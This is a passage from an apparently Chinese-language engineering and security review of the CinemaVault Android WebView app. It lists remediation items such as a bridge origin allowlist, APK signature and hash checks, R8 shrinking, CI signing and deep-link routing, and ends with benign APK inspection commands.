- **目标**：`WebViewCompat.addWebMessageListener(webView, "cvHost", Set.of("https://your-host","https://*.trycloudflare.com"), (view,msg,origin,isMainFrame,reply) -> {...})` —— 该 API 自带 **origin 白名单**（第 3 个参数），是 `addJavascriptInterface` 做不到的；配合 P0-1 的导航白名单，桥才真正只对自家页面开放。H5 侧 `window.AndroidBridge.*` 约 20 处调用点需迁到 `window.cvHost.postMessage`。
- **工作量**：L

### P3-2 843 行 God Activity 拆分

- 现状混了 WebView 配置、桥、更新检查、下载、安装、沉浸式、PiP、键事件、覆盖层、URL 归一化。
- 拆为 `WebViewHost`（配置+导航白名单+生命周期）、`ApkUpdateManager`（检查/下载/校验/安装，可单测）、`BridgeDispatcher`（消息路由+origin 校验）、`ImmersiveController`（insets/系统栏/PiP）、`AppRouter`（`cinemavault://` 路由表）。
- **工作量**：L

### P3-3 CI、版本自增、签名流水线

- 见 P1-13。`.github/workflows/android.yml`：`assembleRelease` + `lint` + `apksigner verify --print-certs` 断言指纹；`versionCode` 由 `git rev-list --count HEAD` 或环境变量注入，消除 P1-12 的手工漂移。
- **工作量**：M

### P3-4 无 R8/资源压缩，dex 9.81MB

- **证据**：`build.gradle:21 minifyEnabled false`；APK 内 `classes.dex` 9,751,968B + `classes2.dex` 492,252B + `classes3.dex` 39,424B = 9.81MB；APK 内带 8 个 `kotlin/*.kotlin_builtins` 与 `kotlinx_coroutines_android.version`，但**项目零 Kotlin 源码**（stdlib 来自 `androidx.webkit`/`material` 的传递依赖）。
- **影响**：9.8MB dex 对只有 5 个桥方法的壳是 20 倍冗余，安装期 dexopt 与冷启动都变慢。
- **修复**：`minifyEnabled true` + `shrinkResources true`（`proguard-rules.pro` 已保留 `@JavascriptInterface` keep 规则，之前因不 minify 未生效）；当前未用任何 `androidx.webkit` alpha API，可先删该依赖省掉 coroutines 传递链。
- **工作量**：M

### P3-5 无 baseline profile / 启动优化

- 无 `src/main/baseline-prof.txt`、无 `androidx.profileinstaller`；`onCreate` 里同步 `loadServerUrl`，白屏期与 H5 首包叠加。
- 修复：接 `profileinstaller` + 录 baseline profile；`loadServerUrl` 延到首帧后（`Choreographer.postFrameCallback`）+ 先显示深色 splash。
- **工作量**：M

### P3-6 深链无路由表、单服务器 profile

- **证据**：`MainActivity.java:183-188` `uriStr.substring(14)` 手切 `cinemavault://`，无 host/路径校验、无 `autoVerify`；`:66-67` 只有单个 `KEY_SERVER_URL`。
- **影响**：深链只能拼路径，无法表达"打开某部影片"；换网络（家里/公司）要重输地址。
- **修复**：`cinemavault://open?path=/movie/123` 路由表 + 统一 `route(Uri)`；服务器 profile 列表 + 当前选中 + `/api/ping` 连通性探测。
- **工作量**：S

### P3-7 分发通道

- 当前"网页里点更新 → 装 APK"是测试期形态。长期应改为固定 HTTPS 域名 + 证书固定（`network_security_config` 的 `<pin-set>`）+ 分发页公示 sha256；APK 内仍保留"与自身签名证书比对"作最后闸（P0-4）。
- **工作量**：M

## 六、如果只做 5 件事（按投入产出排序）

1. **斩断 P0 三链（半天）**：`:272-275` 导航白名单 + 删掉 `else { loadServerUrl(uriStr); }`（`:186-188`/`:208-209`）+ 更新 base 改读 `prefs`（`:302-305`）。合计约 40 行，一次灭掉"任意站点/任意 App/任意页面响应 → 装任意 APK"。
2. **给安装链加密码学约束（1 天）**：服务端下发 `sha256` + `signerSha256`；客户端 `MessageDigest` 校验并与自身证书比对（P0-4）。即使上面漏了，中间人也换不掉包。
3. **补 `onShowFileChooser` + `onCreateWindow`（1 天）**：这两个缺口让 4 个上传按钮和全部 `window.open`（云盘授权、外部资源）静默失效，用户每天都在踩。
4. **建 release 签名并把 `android/` 入 git（1 天）**：没有这一步，其余修复都没有历史、无法回滚；debug 分发更是把"同包名覆盖升级"的钥匙交给任何人。
5. **沉浸式与 insets 现代化（1-2 天）**：`setDecorFitsSystemWindows(false)` + `WindowInsetsListener` + `WindowInsetsControllerCompat` 替换 `:165-168`/`:827-842`，这是**升 target 35 的唯一阻断项**。
> 其余 P1 归下一迭代；P2 与 `02-h5.md`、`03-backend.md` 一起排期。

## 附录：复核命令

```powershell
$bt = "$env:LOCALAPPDATA\Android\Sdk\build-tools\34.0.0"
& "$bt\aapt.exe" dump badging CinemaVault-v4.5.6-Android.apk | Select-String "package|sdkVersion"
& "$bt\aapt.exe" dump xmltree CinemaVault-v4.5.6-Android.apk AndroidManifest.xml | Select-String "debuggable|allowBackup|dataExtraction"
& "$bt\apksigner.bat" verify --print-certs CinemaVault-v4.5.6-Android.apk
python -c "import zipfile;z=zipfile.ZipFile('CinemaVault-v4.5.6-Android.apk');[print(f'{i.file_size:>10} {i.filename}') for i in z.infolist() if i.filename.endswith(('.dex','.png'))]"
git ls-files android/ | Measure-Object -Line   # → 0
```

- 已核实 **N/A**：**16KB page size**——APK 内 `lib/` 为空、0 个 `.so`，当前不适用（未来引入 native 库再处理）。
- 已核实**做对**、勿列入缺陷：返回键优先关全屏（`:473-476`）、第三方 cookie 已开（`:269`）、v2 签名可正常安装、`configChanges` 覆盖了旋转。
